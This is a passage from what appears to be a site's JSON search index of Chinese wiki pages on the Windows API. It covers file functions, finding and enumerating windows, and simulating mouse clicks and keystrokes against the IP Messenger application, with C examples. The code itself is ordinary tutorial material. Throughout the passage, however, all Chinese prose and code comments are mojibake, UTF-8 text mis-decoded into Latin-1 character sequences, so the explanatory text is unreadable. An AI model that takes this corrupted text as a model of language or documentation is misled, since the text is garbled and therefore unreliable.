lpOverlappedï¼šè¾“å…¥å‚æ•°ï¼ŒæŒ‡å‘OVERLAPPEDç»“æ„ä½“çš„æŒ‡é’ˆï¼Œå¦‚æœè°ƒç”¨CreateFileæ—¶è®¾ç½®äº†FILE_FLAG_OVERLAPPEDæ ‡å¿—ï¼Œåˆ™éœ€è¦ä½¿ç”¨è¯¥å‚æ•°ã€‚å¯ä»¥ä¸ºNULLã€‚ 1234567BOOL WriteFile( [in] HANDLE hFile, //æ–‡ä»¶å¥æŸ„ [in] LPCVOID lpBuffer, //data buffer è¦å†™å…¥çš„æ•°æ®åœ¨å“ª [in] DWORD nNumberOfBytesToWrite, //number of bytes to write è¦å†™å¤šå°‘å­—èŠ‚ [out, optional] LPDWORD lpNumberOfBytesWritten, //number of bytes written å®é™…å†™å¤šå°‘å­—èŠ‚ [in, out, optional] LPOVERLAPPED lpOverlapped //overlapped buffer); 12345BOOL CopyFile( [in] LPCTSTR lpExistingFileName, //å·²ç»å­˜åœ¨çš„æ‰€éœ€å¤åˆ¶æ–‡ä»¶çš„æºè·¯å¾„ [in] LPCTSTR lpNewFileName, //æ–°æ–‡ä»¶è·¯å¾„ï¼Œå¤åˆ¶æ–‡ä»¶çš„ç›®çš„è·¯å¾„ [in] BOOL bFailIfExists //ç›®çš„è·¯å¾„çš„æ–‡ä»¶å·²å­˜åœ¨æ—¶æ˜¯å¦è¦†ç›–); bFailIfExists TRUEï¼šlpNewFileNameåå­—çš„æ–‡ä»¶å·²å­˜åœ¨ï¼Œä¸è¦†ç›–ï¼Œå‡½æ•°æ‰§è¡Œå¤±è´¥ FALSEï¼šå³ä½¿lpNewFileNameåå­—çš„æ–‡ä»¶å·²å­˜åœ¨ï¼Œä¼šè¦†å†™æ–‡ä»¶ï¼Œå‡½æ•°æ‰§è¡ŒæˆåŠŸ 123BOOL DeleteFile( [in] LPCTSTR lpFileName); ç¤ºä¾‹ æŸ¥æ‰¾æ–‡ä»¶FindFirstFile()/FindNextFile() 1234HANDLE FindFirstFileA( [in] LPCSTR lpFileName, [out] LPWIN32_FIND_DATAA lpFindFileData); 1234BOOL FindNextFileA( [in] HANDLE hFindFile, [out] LPWIN32_FIND_DATAA lpFindFileData); ç¤ºä¾‹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;windows.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123; // åˆ›å»ºæˆ–æ‰“å¼€æ–‡ä»¶ HANDLE hFile = CreateFile( &quot;C:\\\\A.txt&quot;, // æ–‡ä»¶åï¼šè¦æ‰“å¼€çš„æ–‡ä»¶è·¯å¾„ GENERIC_READ, // è®¿é—®æ¨¡å¼ï¼šæ‰“å¼€æ–‡ä»¶ä»¥è¿›è¡Œè¯»å– 0, // å…±äº«æ¨¡å¼ï¼šä¸ä¸å…¶ä»–è¿›ç¨‹å…±äº«æ–‡ä»¶ NULL, // å®‰å…¨å±æ€§ï¼šé»˜è®¤å®‰å…¨è®¾ç½® OPEN_EXISTING, // åˆ›å»ºæ–¹å¼ï¼šåªæ‰“å¼€ç°æœ‰æ–‡ä»¶ FILE_ATTRIBUTE_NORMAL, // æ–‡ä»¶å±æ€§ï¼šæ™®é€šæ–‡ä»¶å±æ€§ NULL // æ¨¡æ¿æ–‡ä»¶ï¼šä¸ä½¿ç”¨æ¨¡æ¿ ); if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;æ— æ³•æ‰“å¼€æ–‡ä»¶ã€‚ &quot;); return 1; &#125; // åªè¯»å–æ–‡ä»¶çš„å‰10ä¸ªå­—èŠ‚ DWORD bytesToRead = 10; LPSTR pszBuffer = (LPSTR)malloc(bytesToRead + 1); // åˆ†é…11ä¸ªå­—èŠ‚ï¼Œå¤šå‡ºçš„ä¸€ä¸ªå­—èŠ‚ç”¨äºå­˜å‚¨å­—ç¬¦ä¸²ç»“æŸç¬¦&#x27;\\0&#x27; ZeroMemory(pszBuffer, bytesToRead + 1); // åˆå§‹åŒ–å†…å­˜åŒºåŸŸ // è®¾ç½®æ–‡ä»¶æŒ‡é’ˆåˆ°æ–‡ä»¶å¼€å¤´ SetFilePointer(hFile, 0, NULL, FILE_BEGIN); // è¯»å–æ–‡ä»¶å†…å®¹ DWORD dwReadLength; // å®é™…è¯»å–çš„å­—èŠ‚æ•° BOOL readSuccess = ReadFile( hFile, // æ–‡ä»¶å¥æŸ„ï¼šæ“ä½œçš„æ–‡ä»¶ pszBuffer, // ç¼“å†²åŒºï¼šå­˜å‚¨è¯»å–æ•°æ®çš„ç¼“å†²åŒº bytesToRead, // è¯»å–å­—èŠ‚æ•°ï¼šè¦è¯»å–çš„å­—èŠ‚æ•° &amp;dwReadLength, // å®é™…è¯»å–çš„å­—èŠ‚æ•° NULL // é‡å ç»“æ„ï¼šè¿™é‡Œä¸ä½¿ç”¨é‡å ç»“æ„ ); if (!readSuccess) &#123; printf(&quot;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚ &quot;); CloseHandle(hFile); free(pszBuffer); return 1; &#125; // è¾“å‡ºç¼“å†²åŒºå†…å®¹ pszBuffer[dwReadLength] = &#x27;\\0&#x27;; // ç¡®ä¿æœ‰å­—ç¬¦ä¸²ç»“æŸç¬¦ printf(&quot;è¯»å–çš„å†…å®¹ï¼š%s &quot;, pszBuffer); // é‡Šæ”¾å†…å­˜ free(pszBuffer); // å…³é—­æ–‡ä»¶å¥æŸ„ CloseHandle(hFile); return 0;&#125; å°ç»“ åœ¨Windowsç³»ç»Ÿä¸‹æ— è®ºæ˜¯å“ªä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œæ–‡ä»¶ç³»ç»Ÿç»„ç»‡ç»“æ„éƒ½æ˜¯ï¼šæœ€ä¸Šå±‚æ˜¯å·ï¼Œç„¶åä¸‹ä¸€å±‚æ˜¯ç›®å½•ï¼ˆç›®å½•ä¸­ä¹‹ä¸‹å¯ä»¥è¿˜æ˜¯ç›®å½•ï¼Œæˆ–è€…æ˜¯æ–‡ä»¶ï¼‰ï¼Œæœ€åº•å±‚æ˜¯æ–‡ä»¶ã€‚ å·ç›¸å…³API è·å–å·GetLogicalDrives() è·å–ä¸€ä¸ªå·çš„å­—ç¬¦ä¸²GetLogicalDriveStrings() è·å–å·çš„ç±»å‹GetDriveType() è·å–å·çš„è¯¦ç»†ä¿¡æ¯GetVolumeInformation() ç›®å½•ç›¸å…³API åˆ›å»ºç›®å½•CreateDirectory() åˆ é™¤ç›®å½•RemoveDirectory() ä¿®æ”¹ç›®å½•åç§°MoveFile() è·å–å½“å‰è¿›ç¨‹çš„ç›®å½•GetCurrentDirectory() è®¾ç½®å½“å‰è¿›ç¨‹çš„ç›®å½•SetCurrentDirectory() æ–‡ä»¶ç›¸å…³API åˆ›å»ºæ–‡ä»¶CreateFile() è·å–æ–‡ä»¶é•¿åº¦GetFileSize() è·å–æ–‡ä»¶å±æ€§å’Œä¿¡æ¯GetFileAttributes()/GetFileAttributesEx()"},{"title":"æšä¸¾çª—å£ä¸æ¨¡æ‹Ÿé¼ æ ‡å’Œæ¨¡æ‹Ÿé”®ç›˜","path":"/wiki/Windows_API/æšä¸¾çª—å£ä¸æ¨¡æ‹Ÿé¼ æ ‡å’Œæ¨¡æ‹Ÿé”®ç›˜.html","content":"æŸ¥æ‰¾çª—å£ FindWindowAæŸ¥æ‰¾çª—å£ç±»åä¸ºlpClassNameï¼Œçª—å£æ ‡é¢˜åä¸ºlpWindowNameçš„top-level windowçª—å£ã€‚ 1234HWND FindWindowA( [in, optional] LPCSTR lpClassName, // class name çª—å£ç±»å [in, optional] LPCSTR lpWindowName // window name çª—å£æ ‡é¢˜å); ä¸åŒå‚æ•°æƒ…å†µä¸‹çš„è¡Œä¸ºä¸¤ä¸ªå‚æ•°éƒ½ä¸ºç©ºç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç©ºç¬¬äºŒä¸ªå‚æ•°ä¸ºç©º1HWND hwnd = FindWindow(NULL, NULL);å‡½æ•°è¿”å›NULLï¼Œå› ä¸ºæ²¡æœ‰è¶³å¤Ÿçš„ä¿¡æ¯æ¥æŸ¥æ‰¾ä»»ä½•çª—å£ã€‚1HWND hwnd = FindWindow(NULL, &quot;Window Title&quot;);è¯¥å‡½æ•°å°†æŸ¥æ‰¾æ ‡é¢˜ä¸º â€œWindow Titleâ€ çš„çª—å£ã€‚å®ƒä¼šè¿”å›ç¬¬ä¸€ä¸ªåŒ¹é…è¯¥æ ‡é¢˜çš„çª—å£å¥æŸ„ã€‚1HWND hwnd = FindWindow(&quot;ClassName&quot;, NULL);è¯¥å‡½æ•°å°†æŸ¥æ‰¾ç±»åä¸º â€œClassNameâ€ çš„çª—å£ã€‚å®ƒä¼šè¿”å›ç¬¬ä¸€ä¸ªåŒ¹é…è¯¥ç±»åçš„çª—å£å¥æŸ„ã€‚ ä»¥fgä¸ºä¾‹ï¼Œç”¨VSçš„spy++æ‰¾åˆ°fgä¸»çª—å£çš„ç±»åå’Œæ ‡é¢˜åï¼Œç„¶åç”¨ä¸Šé¢è¿™ä¸ªapiæ¥æŸ¥æ‰¾è¯¥çª—å£ spy++æ‰¾åˆ°äº†fgä¸»çª—å£çš„å¥æŸ„ï¼Œçª—å£å¥æŸ„æ˜¯å…¨å±€çš„ï¼Œèƒ½åœ¨ä»£ç ä¸­ç›´æ¥ç”¨ã€‚ä½†fgå¯èƒ½å…³é—­åå†é‡æ–°æ‰“å¼€ï¼Œé‚£fgçš„çª—å£å¥æŸ„ä¼šå˜ã€‚æ‰€ä»¥ç”¨FindWindowä»¥çª—å£ç±»å’Œçª—å£æ ‡é¢˜æ¥å¾—åˆ°çª—å£å¥æŸ„æ‰¾å°±æ¯”è¾ƒç¨³ 12345678910111213141516171819202122#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; // çª—å£ç±»åå’Œçª—å£æ ‡é¢˜ const char* className = &quot;#32770&quot;; const char* windowTitle = &quot;é£é¸½ä¼ ä¹¦ IP Messenger&quot;; // æŸ¥æ‰¾çª—å£ HWND hwnd = FindWindowA(className, windowTitle); if (hwnd != NULL) &#123; printf(&quot;æ‰¾åˆ°çª—å£ï¼Œçª—å£å¥æŸ„å€¼ä¸º: %p &quot;, hwnd); &#125; else &#123; printf(&quot;æœªæ‰¾åˆ°çª—å£ &quot;); &#125; return 0;&#125; è¿è¡Œè¾“å‡º1æ‰¾åˆ°çª—å£ï¼Œçª—å£å¥æŸ„å€¼ä¸º: 000409A0 æ‰¾åˆ°çª—å£åæˆ‘ä»¬åšäº›äº‹ ç”¨SendMessageå‘WM_CLOSEæ¶ˆæ¯æ¥å®ç°å…³é—­çª—å£ 123456LRESULT SendMessage( [in] HWND hWnd, // handle to destination window [in] UINT Msg, // message WPARAM wParam [in] WPARAM wParam, // first message parameter [in] LPARAM lParam // second message parameter); åˆ‡æ¢åˆ°è¿™ä¸ªçª—å£ SwitchToThisWindow å‡½æ•°ä¼šå°†æŒ‡å®šçš„çª—å£å¸¦åˆ°å‰å°ï¼Œå¹¶å°†é”®ç›˜ç„¦ç‚¹è®¾ç½®åˆ°è¯¥çª—å£ä¸Šã€‚ 1234void SwitchToThisWindow( [in] HWND hwnd, //è¦åˆ‡æ¢åˆ°çš„çª—å£çš„å¥æŸ„ [in] BOOL fUnknown); fUnknown å¦‚æœä¸º TRUEï¼Œåˆ™çª—å£è¢«åˆ‡æ¢æ—¶æ¨¡æ‹ŸæŒ‰ä¸‹ ALT+TAB é”®ï¼› å¦‚æœä¸º FALSEï¼Œåˆ™åªæ˜¯ç®€å•åœ°åˆ‡æ¢åˆ°çª—å£è€Œä¸æ¨¡æ‹ŸæŒ‰é”® SwitchToThisWindowåœ¨ Windows 7 åŠæ›´é«˜ç‰ˆæœ¬ä¸­å·²ç»è¢«æ ‡è®°ä¸ºä¸æ¨èä½¿ç”¨ï¼Œå¯¹äºè¾ƒæ–°çš„ Windows ç‰ˆæœ¬ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ SetForegroundWindow æˆ–è€…ç»“åˆ AttachThreadInput å‡½æ•°æ¥å®ç°ç±»ä¼¼çš„æ•ˆæœ 12345678910111213141516171819202122232425262728293031323334353637#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; // çª—å£ç±»åå’Œçª—å£æ ‡é¢˜ const char* className = &quot;#32770&quot;; const char* windowTitle = &quot;é£é¸½ä¼ ä¹¦ IP Messenger&quot;; // æŸ¥æ‰¾çª—å£ HWND hwnd = FindWindowA(className, windowTitle); // åˆ¤æ–­æ˜¯å¦æ‰¾åˆ°çª—å£ if (hwnd == NULL) &#123; printf(&quot;æœªæ‰¾åˆ°çª—å£ &quot;); return 1; &#125; // æ‰¾åˆ°çª—å£ï¼Œæ‰“å°å¥æŸ„å€¼ printf(&quot;æ‰¾åˆ°çª—å£ï¼Œçª—å£å¥æŸ„å€¼ä¸º: %p &quot;, hwnd); // ä¿®æ”¹çª—å£æ ‡é¢˜ const char* newWindowTitle = &quot;æ–°æ ‡é¢˜ - é£é¸½ä¼ ä¹¦&quot;; SetWindowTextA(hwnd, newWindowTitle); // åˆ‡æ¢åˆ°è¯¥çª—å£ SwitchToThisWindow(hwnd, TRUE); // ç¡çœ 3ç§’ Sleep(3000); // å‘é€WM_CLOSEæ¶ˆæ¯å…³é—­çª—å£ SendMessage(hwnd, WM_CLOSE, 0, 0); return 0;&#125; è¿è¡Œåï¼Œfgä¸»çª—å£æ ‡é¢˜è¢«ä¿®æ”¹ä¸ºâ€œæ–°æ ‡é¢˜ - é£é¸½ä¼ ä¹¦â€ï¼Œæ‰§è¡ŒSwitchToThisWindowåfgçª—å£è¢«åˆ‡æ¢å‡ºæ¥ï¼Œç¡çœ 3såï¼Œfgçª—å£è¢«å…³é—­ æŸ¥æ‰¾å­çª—å£ å‡è®¾æˆ‘ä»¬è¦æ‰¾fgä¸­çš„ç¼–è¾‘æ¡†å­çª—å£ æ–¹æ³•ä¸€ï¼šFindWindowExAæ–¹æ³•äºŒï¼šGetDlgItem123456HWND FindWindowExA( [in, optional] HWND hWndParent, // handle to parent window [in, optional] HWND hWndChildAfter, // handle to child window [in, optional] LPCSTR lpszClass, // class name [in, optional] LPCSTR lpszWindow // window name); 1234567891011121314151617181920212223242526272829303132333435#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; // çˆ¶çª—å£ç±»åå’Œæ ‡é¢˜ const char* className = &quot;#32770&quot;; const char* windowTitle = &quot;é£é¸½ä¼ ä¹¦ IP Messenger&quot;; // æŸ¥æ‰¾çˆ¶çª—å£ HWND hwndParent = FindWindow(className, windowTitle); if (hwndParent == NULL) &#123; printf(&quot;æœªæ‰¾åˆ°çˆ¶çª—å£ &quot;); return 1; &#125; // æŸ¥æ‰¾å­çª—å£ (Edit æ§ä»¶) HWND hwndEdit = FindWindowEx(hwndParent, NULL, &quot;Edit&quot;, NULL); if (hwndEdit == NULL) &#123; printf(&quot;æœªæ‰¾åˆ°å­çª—å£ &quot;); return 1; &#125; // è®¾ç½®å­çª—å£çš„æ ‡é¢˜ SetWindowText(hwndEdit, &quot;æ–°æ ‡é¢˜ - Edit æ§ä»¶&quot;); // å‘é€æ¶ˆæ¯ä¿®æ”¹å­çª—å£ä¸­çš„å†…å®¹ SendMessage(hwndEdit, WM_SETTEXT, 0, (LPARAM)&quot;è¿™æ˜¯æ–°çš„å†…å®¹&quot;); printf(&quot;å·²ä¿®æ”¹å­çª—å£å†…å®¹ &quot;); return 0;&#125; æ‰§è¡ŒåEditæ§ä»¶çš„æ ‡é¢˜ä¼šè¢«ä¿®æ”¹ä¸º&quot;æ–°æ ‡é¢˜ - Edit æ§ä»¶&quot;ï¼Œæ‰§è¡ŒSendMessageåEditæ§ä»¶ä¸­çš„å†…å®¹ä¼šå¤šå‡ºâ€œè¿™æ˜¯æ–°çš„å†…å®¹â€ æ‰§è¡ŒSetWindowTextåEditæ§ä»¶çš„æ ‡é¢˜ä¼šè¢«ä¿®æ”¹ï¼›ä½†æ²¡è¯•æˆåŠŸï¼Œåè€Œå¯¹ä¸Šé¢é‚£ä¸ªSysListView32æ”¹æ ‡é¢˜å°±æˆåŠŸäº†ã€‚ è€Œä¸”è®¾ç½®Editå†…å®¹åï¼Œspy++ä¸Šåè€Œæ˜¾ç¤ºæ ‡é¢˜æ”¹äº† åé¢æœ‰éœ€è¦å†æ·±å…¥çœ‹ä¸‹ï¼Œå…ˆè¿™æ ·spy++ä¸Šå®šä½åˆ°fgä¸»çª—å£ï¼Œç„¶åä¼šæ˜¾ç¤ºfgä¸­æ‰€æœ‰å­æ§ä»¶ï¼Œé€‰æ‹©Editæ§ä»¶ï¼Œå³é”®å±æ€§å¯ä»¥çœ‹åˆ°æ§ä»¶IDã€‚ç„¶åæˆ‘ä»¬å°±å¯ä»¥ç”¨GetDlgItemè·å¾—è¿™ä¸ªæ§ä»¶çš„çª—å£å¥æŸ„ å¦‚æœä¸€ä¸ªç¨‹åºä¸­æœ‰å¾ˆå¤šä¸ªEditæ§ä»¶ï¼Œä¹Ÿéƒ½æ²¡æœ‰æ ‡é¢˜ï¼Œç”¨FindWindowExä¼šæ‰¾åˆ°ä¸€å †çª—å£å¥æŸ„ï¼Œæ€ä¹ˆçŸ¥é“å“ªä¸ªæ˜¯å“ªä¸ªï¼Ÿå°±å¯ä»¥ç”¨ä¸Šé¢çš„è¿™ä¸ªæ–¹æ³•å¾—çŸ¥ 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; // çˆ¶çª—å£ç±»åå’Œæ ‡é¢˜ const char* className = &quot;#32770&quot;; const char* windowTitle = &quot;é£é¸½ä¼ ä¹¦ IP Messenger&quot;; // æŸ¥æ‰¾çˆ¶çª—å£ HWND hwndParent = FindWindow(className, windowTitle); if (hwndParent == NULL) &#123; printf(&quot;æœªæ‰¾åˆ°çˆ¶çª—å£ &quot;); return 1; &#125; // Edit æ§ä»¶çš„ ID const int editID = 0x3E9; // æŸ¥æ‰¾å­çª—å£ (Edit æ§ä»¶) HWND hwndEdit = GetDlgItem(hwndParent, editID); if (hwndEdit == NULL) &#123; printf(&quot;æœªæ‰¾åˆ°å­çª—å£ &quot;); return 1; &#125; // è®¾ç½®å­çª—å£çš„æ ‡é¢˜ SetWindowText(hwndEdit, &quot;æ–°æ ‡é¢˜ - Edit æ§ä»¶&quot;); //è·å–å†…å®¹ //TCHAR szTitle[MAX_PATH] = &#123; 0 &#125;; //SendMessage(hEdit, WM_GETTEXT, MAX_PATH, (LPARAM)szTitle); // å‘é€æ¶ˆæ¯ä¿®æ”¹å­çª—å£å†…å®¹ SendMessage(hwndEdit, WM_SETTEXT, 0, (LPARAM)&quot;è¿™æ˜¯æ–°çš„å†…å®¹&quot;); return 0;&#125; æšä¸¾å­çª—å£æ§ä»¶ EnumChildWindowsç”¨äºæšä¸¾æŒ‡å®šçˆ¶çª—å£çš„æ‰€æœ‰å­çª—å£ã€‚æ¯æ‰¾åˆ°ä¸€ä¸ªå­çª—å£å°±ä¼šè°ƒç”¨ä¸€æ¬¡å›è°ƒå‡½æ•°ã€‚ åœ¨å›è°ƒå‡½æ•°ä¸­ï¼Œè¿”å›TRUEè¡¨ç¤ºç»§ç»­æšä¸¾å­çª—å£ï¼Œè¿”å›FALSEè¡¨ç¤ºåœæ­¢æšä¸¾å­çª—å£ 12345BOOL EnumChildWindows( [in, optional] HWND hWndParent, // handle to parent window [in] WNDENUMPROC lpEnumFunc, // callback function [in] LPARAM lParam // application-defined value); å‚æ•°hWndParentï¼šè¦æšä¸¾å…¶å­çª—å£çš„çˆ¶çª—å£å¥æŸ„ã€‚å¦‚æœæ­¤å‚æ•°ä¸º NULLï¼Œåˆ™å‡½æ•°ä¼šæšä¸¾æ‰€æœ‰é¡¶å±‚çª—å£ã€‚ å‚æ•°lpEnumFuncï¼šå›è°ƒå‡½æ•° å‚æ•°lParamï¼šä¼ é€’ç»™å›è°ƒå‡½æ•°çš„åº”ç”¨ç¨‹åºå®šä¹‰å€¼ 1234567891011121314151617181920212223242526272829303132333435#include &lt;windows.h&gt;#include &lt;stdio.h&gt;// å›è°ƒå‡½æ•°ï¼Œç”¨äºæšä¸¾å­çª—å£BOOL CALLBACK EnumChildProc(HWND hwndChild, LPARAM lParam)&#123; char windowText[256]; // è·å–å­çª—å£çš„æ ‡é¢˜ GetWindowTextA(hwndChild, windowText, sizeof(windowText)); // æ‰“å°å­çª—å£å¥æŸ„å’Œæ ‡é¢˜ printf(&quot;å­çª—å£å¥æŸ„: %p, æ ‡é¢˜: %s &quot;, hwndChild, windowText); return TRUE; // è¿”å› TRUE ä»¥ç»§ç»­æšä¸¾å­çª—å£&#125;int main()&#123; // çˆ¶çª—å£ç±»åå’Œæ ‡é¢˜ const char* className = &quot;#32770&quot;; const char* windowTitle = &quot;é£é¸½ä¼ ä¹¦ IP Messenger&quot;; // æŸ¥æ‰¾çˆ¶çª—å£ HWND hwndParent = FindWindowA(className, windowTitle); if (hwndParent == NULL) &#123; printf(&quot;æœªæ‰¾åˆ°çˆ¶çª—å£ &quot;); return 1; &#125; // æšä¸¾å­çª—å£ EnumChildWindows(hwndParent, EnumChildProc, 0); return 0;&#125; è¿è¡Œè¾“å‡º1234567891011å­çª—å£å¥æŸ„: 022E0BB4, æ ‡é¢˜:å­çª—å£å¥æŸ„: 006E1124, æ ‡é¢˜: å‘é€(&amp;S)å­çª—å£å¥æŸ„: 00101126, æ ‡é¢˜: å°è£…(&amp;E)å­çª—å£å¥æŸ„: 00210F00, æ ‡é¢˜: ä¸Šé”(&amp;K)å­çª—å£å¥æŸ„: 00281134, æ ‡é¢˜: åˆ·æ–°(&amp;R)å­çª—å£å¥æŸ„: 0010113E, æ ‡é¢˜: åœ¨çº¿ç”¨æˆ·1å­çª—å£å¥æŸ„: 00351278, æ ‡é¢˜:å­çª—å£å¥æŸ„: 002107F6, æ ‡é¢˜: List1å­çª—å£å¥æŸ„: 00140ECC, æ ‡é¢˜:å­çª—å£å¥æŸ„: 002F0D08, æ ‡é¢˜: ipmsg.exe(100KB) æšä¸¾æ‰€æœ‰æ‰“å¼€çš„çª—å£ ç”¨EnumWindowsæšä¸¾ç³»ç»Ÿä¸Šå·²æ‰“å¼€çš„æ‰€æœ‰é¡¶å±‚çª—å£ï¼ˆtop-level windows ï¼‰ï¼Œæ¯æ‰¾åˆ°ä¸€ä¸ªçª—å£å°±ä¼šè°ƒç”¨ä¸€æ¬¡å›è°ƒå‡½æ•°ã€‚ åœ¨å›è°ƒå‡½æ•°ä¸­ï¼Œè¿”å›TRUEè¡¨ç¤ºç»§ç»­æšä¸¾çª—å£ï¼Œè¿”å›FALSEè¡¨ç¤ºåœæ­¢æšä¸¾çª—å£ã€‚ 1234BOOL EnumWindows( [in] WNDENUMPROC lpEnumFunc, // callback function å›è°ƒå‡½æ•° [in] LPARAM lParam // application-defined value); 123456789101112131415161718192021222324252627282930#include &lt;windows.h&gt;#include &lt;stdio.h&gt;// å›è°ƒå‡½æ•°ï¼Œç”¨äºæšä¸¾é¡¶å±‚çª—å£BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)&#123; char windowText[256]; // è·å–çª—å£çš„æ ‡é¢˜ GetWindowTextA(hwnd, windowText, sizeof(windowText)); // æ‰“å°çª—å£å¥æŸ„å’Œæ ‡é¢˜ printf(&quot;çª—å£å¥æŸ„: %p, æ ‡é¢˜: %s &quot;, hwnd, windowText); // æ¯”è¾ƒçª—å£æ ‡é¢˜ if (strcmp(windowText, &quot;é£é¸½ä¼ ä¹¦ IP Messenger&quot;) == 0) &#123; printf(&quot;æ‰¾åˆ°ç›®æ ‡çª—å£ &quot;); return FALSE; // è¿”å› FALSE åœæ­¢æšä¸¾ &#125; return TRUE; // è¿”å› TRUE ç»§ç»­æšä¸¾&#125;int main()&#123; // æšä¸¾æ‰€æœ‰é¡¶å±‚çª—å£ï¼ˆtop-level windows ï¼‰ EnumWindows(EnumWindowsProc, 0); return 0;&#125; æ¨¡æ‹Ÿé¼ æ ‡ç‚¹å‡» ç”¨GetWindowRectè·å–ButtonæŒ‰é’®çª—å£çš„åæ ‡ï¼Œè¿™ä¸ªåæ ‡æ˜¯æŒ‰é’®ç›¸å¯¹äºæ•´ä¸ªæ¡Œé¢çš„å·¦è¾¹ ç”¨SetCursorPosè®¾ç½®é¼ æ ‡çš„ä½ç½®ï¼Œxå’Œyéƒ½+10ï¼ˆä¼°ç®—çš„ï¼‰ï¼Œå› ä¸ºé¼ æ ‡æ”¾åˆ·æ–°æŒ‰é’®å·¦ä¸Šè§’æ˜¯æ— æ³•ç‚¹å‡»çš„ ç”¨mouse_eventæ¨¡æ‹Ÿé¼ æ ‡å·¦é”®æŒ‰ä¸‹å’Œæ¾å¼€æ“ä½œï¼Œå®ç°ç‚¹å‡»æŒ‰é’®çš„æ•ˆæœ msdnä¸Šè¯´mouse_eventå‡½æ•°è¢«å–ä»£ï¼Œç°åœ¨å»ºè®®ç”¨SendInputå‡½æ•° 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#pragma comment(linker,&quot;/subsystem:\\&quot;windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot; ) int main()&#123; // çˆ¶çª—å£ç±»åå’Œæ ‡é¢˜ const char* className = &quot;#32770&quot;; const char* windowTitle = &quot;é£é¸½ä¼ ä¹¦ IP Messenger&quot;; // æŸ¥æ‰¾çˆ¶çª—å£ HWND hwndParent = FindWindowA(className, windowTitle); if (hwndParent == NULL) &#123; printf(&quot;æœªæ‰¾åˆ°çˆ¶çª—å£ &quot;); return 1; &#125; // æŸ¥æ‰¾åˆ·æ–°æŒ‰é’®å­æ§ä»¶ HWND hButton = FindWindowExA(hwndParent, NULL, &quot;Button&quot;, &quot;åˆ·æ–°(&amp;R)&quot;); if (hButton == NULL) &#123; printf(&quot;æœªæ‰¾åˆ°åˆ·æ–°æŒ‰é’® &quot;); return 1; &#125; // è·å–æŒ‰é’®çª—å£çš„åæ ‡ RECT r; GetWindowRect(hButton, &amp;r); printf(&quot;åˆ·æ–°æŒ‰é’®åæ ‡: %d, %d &quot;, r.left, r.top); // è®¾ç½®é¼ æ ‡çš„ä½ç½® SetCursorPos(r.left + 10, r.top + 10); Sleep(2000); // æ¨¡æ‹Ÿé¼ æ ‡å·¦é”®å•å‡» mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0); // ç‚¹ä¸‹å·¦é”® mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); // æ¾å¼€å·¦é”® return 0;&#125; æ‰§è¡Œåé¼ æ ‡è¢«ç§»åŠ¨åˆ°åˆ·æ–°æŒ‰é’®é‚£ï¼Œå¹¶ç‚¹å‡»äº† 1#pragma comment(linker,&quot;/subsystem:\\&quot;windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot; ) ä¸Šé¢è¿™å¥å¼ç”¨æ¥éšè—cmdçª—å£ï¼Œæ–¹ä¾¿è§‚å¯Ÿã€‚ï¼ˆå› ä¸ºå­ç³»ç»Ÿè¢«è®¾ç½®ä¸º windowsï¼Œæ‰€ä»¥ç¨‹åºä¸ä¼šæ˜¾ç¤ºæ§åˆ¶å°çª—å£ï¼Œå³ä½¿ç¨‹åºçš„å…¥å£ç‚¹æ˜¯ main è€Œä¸æ˜¯ WinMainï¼‰ å¦‚æœæƒ³ç‚¹å‡»çš„åŒºåŸŸä¸æ˜¯ä¸€ä¸ªæ§ä»¶ï¼Œè€Œæ˜¯ç”»å‡ºæ¥çš„åŒºåŸŸï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ç¦»è¿™å—åŒºåŸŸæœ€è¿‘çš„ä¸€ä¸ªå­æ§ä»¶ï¼Œç„¶ååŠ åç§»è®©é¼ æ ‡ç§»è¿‡å» æ¨¡æ‹Ÿé”®ç›˜ æ‰¾fgä¸»çª—å£ï¼Œå¾—åˆ°Editæ§ä»¶å¥æŸ„ï¼Œå°†é¼ æ ‡ç¨å¾®ç§»ç§»åŠ¨ï¼Œæ¨¡æ‹Ÿå·¦é”®ç‚¹å‡»ï¼Œæ¨¡æ‹Ÿé”®ç›˜è¾“å…¥ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;windows.h&gt;#include &lt;stdio.h&gt;//#pragma comment(linker, &quot;/subsystem:\\&quot;windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;)int main()&#123; // çˆ¶çª—å£ç±»åå’Œæ ‡é¢˜ const char* className = &quot;#32770&quot;; const char* windowTitle = &quot;é£é¸½ä¼ ä¹¦ IP Messenger&quot;; // æŸ¥æ‰¾çˆ¶çª—å£ HWND hwndParent = FindWindowA(className, windowTitle); if (hwndParent == NULL) &#123; printf(&quot;æœªæ‰¾åˆ°çˆ¶çª—å£ &quot;); return 1; &#125; // æŸ¥æ‰¾ç¼–è¾‘æ¡†å­æ§ä»¶ HWND hEdit = GetDlgItem(hwndParent, 0x3E9); if (hEdit == NULL) &#123; printf(&quot;æœªæ‰¾åˆ°ç¼–è¾‘æ¡† &quot;); return 1; &#125; // è·å–ç¼–è¾‘æ¡†çª—å£çš„åæ ‡ RECT r; GetWindowRect(hEdit, &amp;r); printf(&quot;ç¼–è¾‘æ¡†åæ ‡: %d, %d &quot;, r.left, r.top); // è®¾ç½®é¼ æ ‡çš„ä½ç½® SetCursorPos(r.left + 10, r.top + 10); Sleep(1000); // æ¨¡æ‹Ÿé¼ æ 